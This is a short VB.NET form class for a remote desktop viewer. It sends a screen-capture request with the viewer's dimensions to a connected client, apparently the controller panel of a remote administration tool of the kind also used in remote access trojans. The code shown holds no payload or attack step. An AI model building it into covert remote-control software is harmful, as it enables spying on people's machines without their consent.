﻿Imports System.ComponentModel

Public Class RemoteDesktop
    Public F As Form1
    Public C As Client

    Private Sub RemoteDesktop_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            Button1.PerformClick()
        Catch ex As Exception
        End Try
    End Sub

    Private Sub RemoteDesktop_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Try
            Button1.Text = "OFF"
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            If Button1.Text = "OFF" Then
                Button1.Text = "Capturing..."

                Dim B As Byte() = SB("RD+" + Settings.SPL + PictureBox1.Width.ToString + Settings.SPL + PictureBox1.Height.ToString)
                Try
                    Dim ClientReq As New Outcoming_Requests(C, B)
                    Pending.Req_Out.Add(ClientReq)
                Catch ex As Exception
                    C.isDisconnected()
                End Try
            Else
                Button1.Text = "OFF"
            End If

        Catch ex As Exception
        End Try
    End Sub
End Class